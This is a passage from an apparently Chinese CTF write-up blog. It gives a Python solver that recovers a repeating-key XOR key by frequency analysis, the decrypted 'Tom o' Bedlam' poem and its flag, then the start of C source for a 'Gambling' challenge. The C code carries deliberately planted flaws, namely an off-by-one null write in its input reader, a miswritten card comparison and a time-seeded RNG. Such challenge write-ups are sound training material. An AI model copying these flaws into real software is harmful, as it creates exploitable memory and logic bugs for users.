class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: Srpopty</span></span><br><span class="line"><span class="comment"># Time: 2018.6.12</span></span><br><span class="line"><span class="comment"># Exploit of Poem</span></span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters</span><br><span class="line"></span><br><span class="line">VaildChar = ascii_letters + <span class="string">&#x27; \n,.&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetFreq</span>(<span class="params">string</span>):</span><br><span class="line">    freq = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> string:</span><br><span class="line">        freq += <span class="number">1</span> <span class="keyword">if</span> ch <span class="keyword">in</span> VaildChar <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> freq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetCipher</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&#x27;&#x27;</span>.join([line <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines()])).decode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetPlainFromPool</span>(<span class="params">pool, cipher</span>):</span><br><span class="line">    pool_length = <span class="built_in">len</span>(pool)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([pool[i % pool_length][i / pool_length] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher))])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DecryptPool</span>(<span class="params">cipher</span>):</span><br><span class="line">    plain = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    key = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    freq = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        _plain = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(c) ^ ch) <span class="keyword">for</span> c <span class="keyword">in</span> cipher])</span><br><span class="line">        _freq = GetFreq(_plain)</span><br><span class="line">        <span class="keyword">if</span> _freq &gt; freq:</span><br><span class="line">            plain, freq, key = _plain, _freq, <span class="built_in">chr</span>(ch)</span><br><span class="line">    <span class="keyword">return</span> plain, key, freq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">key_size, cipher</span>):</span><br><span class="line">    cipher_pool = [<span class="string">&quot;&quot;</span>] * key_size</span><br><span class="line">    plain_pool = cipher_pool[:]</span><br><span class="line">    key = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    freq = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">        cipher_pool[i % key_size] += cipher[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(key_size):</span><br><span class="line">        plain_pool[i], _key, _freq = DecryptPool(cipher_pool[i])</span><br><span class="line">        freq += _freq</span><br><span class="line">        key += _key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> GetPlainFromPool(plain_pool, cipher), key, freq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    key_min_length, key_max_length = <span class="number">1</span>, <span class="number">50</span></span><br><span class="line">    freq = <span class="number">0</span></span><br><span class="line">    key = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    plain = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    cipher = GetCipher(<span class="string">&#x27;cipher.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> key_size <span class="keyword">in</span> <span class="built_in">range</span>(key_min_length, key_max_length):</span><br><span class="line">        _plain, _key, _freq = Decrypt(key_size, cipher)</span><br><span class="line">        <span class="keyword">if</span> _freq &gt; freq:</span><br><span class="line">            freq, key, plain = _freq, _key, _plain</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[*] Frequency: &#x27;</span> + <span class="built_in">str</span>(freq)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[*] Key: &#x27;</span> + key</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[*] Plain:\n&#x27;</span> + plain</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;flag&#123;%s&#125;&#x27;</span> % key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后解密出的 plain 是一首诗（可能会有几个字母没对上）</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">From the hag and hungry goblin</span><br><span class="line">That into rags would rend ye</span><br><span class="line">The spirit that stands by the naked man</span><br><span class="line">In the Book of Moons defend ye</span><br><span class="line">That of your five sound senses</span><br><span class="line">You never be forsaken</span><br><span class="line">Nor wander from your selves with Tom</span><br><span class="line">Abroad to beg your bacon</span><br><span class="line">While I do sing Any food any feeding</span><br><span class="line">Feeding drink or clothing</span><br><span class="line">Come dame or maid be not afraid</span><br><span class="line">Poor Tom will injure nothing</span><br><span class="line">Of thirty bare years have I</span><br><span class="line">Twice twenty been enraged</span><br><span class="line">And of forty been three times fifteen</span><br><span class="line">In durance soundly caged</span><br><span class="line">On the lordly lofts of Bedlam</span><br><span class="line">With stubble soft and dainty</span><br><span class="line">Brave bracelets strong sweet whips ding dong</span><br><span class="line">With wholesome hunger plenty</span><br><span class="line">And now I sing Any food any feeding</span><br><span class="line">Feeding drink or clothing</span><br><span class="line">Come dame or maid be not afraid</span><br><span class="line">Poor Tom will injure nothing</span><br><span class="line">With a thought I took for Maudlin</span><br><span class="line">And a cruse of cockle pottage</span><br><span class="line">With a thing thus tall sky bless you all</span><br><span class="line">I befell into this dotage</span><br><span class="line">I slept not since the Conquest</span><br><span class="line">Till then I never waked</span><br><span class="line">Till the roguish boy of love where I lay</span><br><span class="line">Me found and stript me naked</span><br><span class="line">While I do sing Any food any feeding</span><br><span class="line">Feeding drink or clothing</span><br><span class="line">Come dame or maid be not afraid</span><br><span class="line">Poor Tom will injure nothing</span><br><span class="line">When I short have shorn my sows face</span><br><span class="line">And swigged my horny barrel</span><br><span class="line">In an oaken inn I pound my skin</span><br><span class="line">As a suit of gilt apparel</span><br><span class="line">The moons my constant mistress</span><br><span class="line">And the lovely owl my marrow</span><br><span class="line">The flaming drake and the night crow make</span><br><span class="line">Me music to my sorrow</span><br><span class="line">While I do sing Any food any feeding</span><br><span class="line">Feeding drink or clothing</span><br><span class="line">Come dame or maid be not afraid</span><br><span class="line">Poor Tom will injure nothing</span><br><span class="line">The palsy plagues my pulses</span><br><span class="line">When I prig your pigs or pullen</span><br><span class="line">Your culvers take or matchless make</span><br><span class="line">Your Chanticleer or Sullen</span><br><span class="line">When I want provant with Humphry</span><br><span class="line">I sup and when benighted</span><br><span class="line">I repose in Pauls with waking souls</span><br><span class="line">Yet never am affrighted</span><br><span class="line">But I do sing Any food any feeding</span><br><span class="line">Feeding drink or clothing</span><br><span class="line">Come dame or maid be not afraid</span><br><span class="line">Poor Tom will injure nothing</span><br><span class="line">I know more than Apollo</span><br><span class="line">For oft when he lies sleeping</span><br><span class="line">I see the stars at mortal wars</span><br><span class="line">In the wounded welkin weeping</span><br><span class="line">The moon embrace her shepherd</span><br><span class="line">And the Queen of Love her warrior</span><br><span class="line">While the first doth horn the star of morn</span><br><span class="line">And the next the heavenly Farrier</span><br><span class="line">While I do sing Any food any feeding</span><br><span class="line">Feeding drink or clothing</span><br><span class="line">Come dame or maid be not afraid</span><br><span class="line">Poor Tom will injure nothing</span><br><span class="line">The Gypsies Snap and Pedro</span><br><span class="line">Are none of Toms comradoes</span><br><span class="line">The punk I scorn and the cutpurse sworn</span><br><span class="line">And the roaring boys bravadoes</span><br><span class="line">The meek the white the gentle</span><br><span class="line">Me handle not nor spare not</span><br><span class="line">But those that cross Tom Rynosseross</span><br><span class="line">Do what the panther dare not</span><br><span class="line">Although I sing Any food any feeding</span><br><span class="line">Feeding drink or clothing</span><br><span class="line">Come dame or maid be not afraid</span><br><span class="line">Poor Tom will injure nothing</span><br><span class="line">With an host of furious fancies</span><br><span class="line">Whereof I am commander</span><br><span class="line">With a burning spear and a horse of air</span><br><span class="line">To the wilderness I wander</span><br><span class="line">By a knight of ghosts and shadows</span><br><span class="line">I summoned am to tourney</span><br><span class="line">Ten leagues beyond the wide worlds end</span><br><span class="line">Methinks it is no journey</span><br><span class="line">Yet I will sing Any food any feeding</span><br><span class="line">Feeding drink or clothing</span><br><span class="line">Come dame or maid be not afraid</span><br><span class="line">Poor Tom will injure nothing</span><br></pre></td></tr></table></figure><p>解出的 flag 为</p><blockquote><p>flag{1_dO_n0oooooot_L1k3_Cryp7ogr4phy}</p></blockquote><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Gambling"><a href="#Gambling" class="headerlink" title="Gambling"></a>Gambling</h2><p>题目源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NAMEBUFFLEN 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BETBUFFLEN 8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">card</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> suit;</span><br><span class="line">    <span class="type">char</span> value;</span><br><span class="line">&#125; card;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">deck</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> deckSize;</span><br><span class="line">    <span class="type">size_t</span> top;</span><br><span class="line">    card cards[<span class="number">52</span>];</span><br><span class="line">&#125; deck;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">player</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> money;</span><br><span class="line">    deck playerCards;</span><br><span class="line">&#125; player;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">gameState</span>&#123;</span></span><br><span class="line">  <span class="type">int</span> playerMoney;</span><br><span class="line">  player ctfer;</span><br><span class="line">  <span class="type">char</span> name[NAMEBUFFLEN];</span><br><span class="line">  <span class="type">size_t</span> deckSize;</span><br><span class="line">  player opponent;</span><br><span class="line">&#125; gameState;</span><br><span class="line"></span><br><span class="line">gameState gameData;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Shuffles the deck</span></span><br><span class="line"><span class="comment">//Make sure to call srand() before!</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">shuffle</span><span class="params">(deck * inputDeck)</span>&#123;</span><br><span class="line">    card temp;</span><br><span class="line">    <span class="type">size_t</span> indexA, indexB;</span><br><span class="line">    <span class="type">size_t</span> deckSize = inputDeck-&gt;deckSize;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">unsigned</span> <span class="type">int</span> i=<span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)&#123;</span><br><span class="line">        indexA = rand() % deckSize;</span><br><span class="line">        indexB = rand() % deckSize;</span><br><span class="line">        temp = inputDeck-&gt;cards[indexA];</span><br><span class="line">        inputDeck-&gt;cards[indexA] = inputDeck-&gt;cards[indexB];</span><br><span class="line">        inputDeck-&gt;cards[indexB] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Checks if a card is in invalid range</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">checkInvalidCard</span><span class="params">(card * inputCard)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(inputCard-&gt;suit &gt; <span class="number">4</span> || inputCard-&gt;value &gt; <span class="number">14</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Reads input from user, and properly terminates the string</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">readInput</span><span class="params">(<span class="type">char</span> * buff, <span class="type">unsigned</span> <span class="type">int</span> len)</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    <span class="keyword">while</span>((c = getchar()) != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; c != EOF)&#123;</span><br><span class="line">        <span class="keyword">if</span>(count &lt; (len<span class="number">-1</span>))&#123;</span><br><span class="line">            buff[count] = c;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    buff[count+<span class="number">1</span>] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Builds the deck for each player.</span></span><br><span class="line"><span class="comment">//Good luck trying to win ;)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildDecks</span><span class="params">(player * ctfer, player * opponent)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; j++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">            ctfer-&gt;playerCards.cards[j*<span class="number">4</span> + i].suit = i;</span><br><span class="line">            ctfer-&gt;playerCards.cards[j*<span class="number">4</span> + i].value = j+<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; j++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">            opponent-&gt;playerCards.cards[j*<span class="number">4</span> + i].suit = i;</span><br><span class="line">            opponent-&gt;playerCards.cards[j*<span class="number">4</span> + i].value = j+<span class="number">9</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ctfer-&gt;playerCards.cards[<span class="number">24</span>].suit = <span class="number">0</span>;</span><br><span class="line">    ctfer-&gt;playerCards.cards[<span class="number">24</span>].value = <span class="number">8</span>;</span><br><span class="line">    ctfer-&gt;playerCards.cards[<span class="number">25</span>].suit = <span class="number">1</span>;</span><br><span class="line">    ctfer-&gt;playerCards.cards[<span class="number">25</span>].value = <span class="number">8</span>;</span><br><span class="line">    opponent-&gt;playerCards.cards[<span class="number">24</span>].suit = <span class="number">2</span>;</span><br><span class="line">    opponent-&gt;playerCards.cards[<span class="number">24</span>].value = <span class="number">8</span>;</span><br><span class="line">    opponent-&gt;playerCards.cards[<span class="number">25</span>].suit = <span class="number">3</span>;</span><br><span class="line">    opponent-&gt;playerCards.cards[<span class="number">25</span>].value = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    ctfer-&gt;playerCards.deckSize = <span class="number">26</span>;</span><br><span class="line">    ctfer-&gt;playerCards.top = <span class="number">0</span>;</span><br><span class="line">    opponent-&gt;playerCards.deckSize = <span class="number">26</span>;</span><br><span class="line">    opponent-&gt;playerCards.top = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>**argv)</span>&#123;</span><br><span class="line">    <span class="type">char</span> betStr[BETBUFFLEN];</span><br><span class="line">    card * oppCard;</span><br><span class="line">    card * playCard;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;gameData, <span class="number">0</span>, <span class="keyword">sizeof</span>(gameData));</span><br><span class="line">    gameData.playerMoney = <span class="number">100</span>;</span><br><span class="line">    <span class="type">int</span> bet;</span><br><span class="line"></span><br><span class="line">    buildDecks(&amp;gameData.ctfer, &amp;gameData.opponent);</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));<span class="comment">//Not intended to be cryptographically strong</span></span><br><span class="line"></span><br><span class="line">    shuffle(&amp;gameData.ctfer.playerCards);</span><br><span class="line">    shuffle(&amp;gameData.opponent.playerCards);</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Set to be the smaller of the two decks.</span></span><br><span class="line">    gameData.deckSize = gameData.ctfer.playerCards.deckSize &gt; gameData.opponent.playerCards.deckSize</span><br><span class="line">         ? gameData.opponent.playerCards.deckSize : gameData.ctfer.playerCards.deckSize;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your name: \n&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(gameData.name,<span class="number">0</span>,NAMEBUFFLEN);</span><br><span class="line">    <span class="keyword">if</span>(!readInput(gameData.name,NAMEBUFFLEN))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Read error. Exiting.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome %s\n&quot;</span>, gameData.name);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="type">size_t</span> playerIndex = gameData.ctfer.playerCards.top;</span><br><span class="line">        <span class="type">size_t</span> oppIndex = gameData.opponent.playerCards.top;</span><br><span class="line">        oppCard = &amp;gameData.opponent.playerCards.cards[oppIndex];</span><br><span class="line">        playCard = &amp;gameData.ctfer.playerCards.cards[playerIndex];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;You have %d coins.\n&quot;</span>, gameData.playerMoney);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;How much would you like to bet?\n&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(betStr,<span class="number">0</span>,BETBUFFLEN);</span><br><span class="line">        <span class="keyword">if</span>(!readInput(betStr,BETBUFFLEN))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Read error. Exiting.\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        bet = atoi(betStr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;you bet %d.\n&quot;</span>,bet);</span><br><span class="line">        <span class="keyword">if</span>(!bet)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Invalid bet\n&quot;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(bet &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;No negative betting for you!\n&quot;</span>);</span><br><span class="line">           <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(bet &gt; gameData.playerMoney)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;You don&#x27;t have much.\n&quot;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The opponent has a %d of suit %d.\n&quot;</span>, oppCard-&gt;value, oppCard-&gt;suit);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;You have a %d of suit %d.\n&quot;</span>, playCard-&gt;value, playCard-&gt;suit);</span><br><span class="line">        <span class="keyword">if</span>((playCard-&gt;value * <span class="number">4</span> + playCard-&gt;suit) &gt; (oppCard-&gt;value * <span class="number">4</span> + playCard-&gt;suit))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Something must be wrong...\n&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(checkInvalidCard(playCard))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s not actually a valid card.\n&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;You won!\n&quot;</span>);</span><br><span class="line">                gameData.playerMoney += bet;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span 